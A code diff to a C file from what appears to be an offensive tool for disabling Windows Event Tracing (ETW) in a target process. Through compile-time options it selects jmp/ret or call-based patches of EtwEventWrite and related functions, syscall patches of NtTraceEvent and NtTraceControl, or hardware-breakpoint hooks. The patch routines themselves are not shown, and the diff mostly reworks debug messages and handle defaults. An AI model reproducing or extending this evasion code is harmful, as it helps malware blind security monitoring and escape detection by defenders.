@@ -1,83 +1,86 @@
 #include "etw_bypass.h"
 
 BOOL applyEtwBypass(HANDLE hProcess) {
-    DebugPrint("\n<============= ETW Bypass [PID - %d] =============>\n", GetProcessId(hProcess));
+    if (hProcess == NULL)
+        hProcess = NtCurrentProcess();
+
+    DebugPrint("\n<========     ETW Bypass [PID - %d]     ========>\n", GetProcessId(hProcess));
 #if defined(JMP_RET_BASED_ETW_PATCH)
     /*if (!JmpRetBasedEtwPatch(hProcess, "EtwpEventWriteFull")) {
         DebugPrint("[!] JmpRetBasedEtwPatch on EtwpEventWriteFull failed\n");
-		DebugPrint("===============================================\n\n");
+		DebugPrint("<=====================================>\n\n");
         return FALSE;
     }*/
     if (!JmpRetBasedEtwPatch(hProcess, "EtwEventWrite")) {
         DebugPrint("[!] JmpRetBasedEtwPatch on EtwEventWrite failed\n");
-		DebugPrint("===============================================\n\n");
+		DebugPrint("<=====================================>\n\n");
         return FALSE;
     }
     if (!JmpRetBasedEtwPatch(hProcess, "EtwEventWriteEx")) {
         DebugPrint("[!] JmpRetBasedEtwPatch on EtwEventWriteEx failed\n");
-        DebugPrint("===============================================\n\n");
+        DebugPrint("<=====================================>\n\n");
         return FALSE;
     }
     if (!JmpRetBasedEtwPatch(hProcess, "EtwEventWriteFull")) {
         DebugPrint("[!] JmpRetBasedEtwPatch on EtwEventWrite failed\n");
-        DebugPrint("===============================================\n\n");
+        DebugPrint("<=====================================>\n\n");
         return FALSE;
     }
 #elif defined(CALL_BASED_ETW_PATCH)
     if (!CallBasedEtwPatch(hProcess, "EtwEventWrite")) {
         DebugPrint("[!] CallBasedEtwPatch on EtwEventWrite failed\n");
-        DebugPrint("===============================================\n\n");
+        DebugPrint("<=====================================>\n\n");
         return FALSE;
     }
     if (!CallBasedEtwPatch(hProcess, "EtwEventWriteEx")) {
         DebugPrint("[!] CallBasedEtwPatch on EtwEventWriteEx failed\n");
-        DebugPrint("===============================================\n\n");
+        DebugPrint("<=====================================>\n\n");
         return FALSE;
     }
     if (!CallBasedEtwPatch(hProcess, "EtwEventWriteFull")) {
         DebugPrint("[!] CallBasedEtwPatch on EtwEventWriteFull failed\n");
-        DebugPrint("===============================================\n\n");
+        DebugPrint("<=====================================>\n\n");
         return FALSE;
     }
 #elif defined(SYSCALL_BASED_ETW_PATCH)
     if (!SyscallPatchEtw(hProcess, "NtTraceEvent")) {
         DebugPrint("[!] SyscallPatchEtw on NtTraceEvent failed\n");
-        DebugPrint("===============================================\n\n");
+        DebugPrint("<=====================================>\n\n");
         return FALSE;
     }
     if (!SyscallPatchEtw(hProcess, "NtTraceControl")) {
         DebugPrint("[!] SyscallPatchEtw on NtTraceControl failed\n");
-        DebugPrint("===============================================\n\n");
+        DebugPrint("<=====================================>\n\n");
         return FALSE;
     }
 #elif defined(HBP_ETW_HOOKING)
     if (!HbpEtwHooking(hProcess, "EtwpEventWriteFull")) {
         DebugPrint("[!] HbpEtwHooking on EtwpEventWriteFull failed\n");
-        DebugPrint("===============================================\n\n");
+        DebugPrint("<=====================================>\n\n");
         return FALSE;
     }
     /*if (!HbpEtwHooking(hProcess, "EtwEventWrite")) {
         DebugPrint("[!] HbpEtwHooking on EtwEventWrite failed\n");
-        DebugPrint("===============================================\n\n");
+        DebugPrint("<=====================================>\n\n");
         return FALSE;
     }
     if (!HbpEtwHooking(hProcess, "EtwEventWriteEx")) {
         DebugPrint("[!] HbpEtwHooking on EtwEventWriteEx failed\n");
-        DebugPrint("===============================================\n\n");
+        DebugPrint("<=====================================>\n\n");
         return FALSE;
     }
     if (!HbpEtwHooking(hProcess, "EtwEventWriteFull")) {
         DebugPrint("[!] HbpEtwHooking on EtwEventWriteFull failed\n");
-        DebugPrint("===============================================\n\n");
+        DebugPrint("<=====================================>\n\n");
         return FALSE;
     }*/
 #else
     DebugPrint("[!] No ETW Technique selected\n");
-    DebugPrint("<===============================================>\n\n");
+    DebugPrint("<===================================================>\n\n");
     return TRUE;
 #endif
     DebugPrint("[+] ETW Bypass applied successfully!\n");
-    DebugPrint("<===============================================>\n\n");
+    DebugPrint("<===================================================>\n\n");
     return TRUE;
 }
 
@@ -95,10 +98,6 @@ PVOID _fetchEtwpEventWriteFullAddr(HANDLE hProcess) {
 		DebugPrint("[!] Memory allocation failed\n");
 		return NULL;
 	}
-
-    if (hProcess == NULL) {
-        hProcess = NtCurrentProcess();
-    }
 
 	// Get the address of "EtwEventWrite" in the remote process
 	pEtwEventFunc = (PBYTE)GetProcAddress(GetModuleHandleA("NTDLL"), "EtwEventWrite");
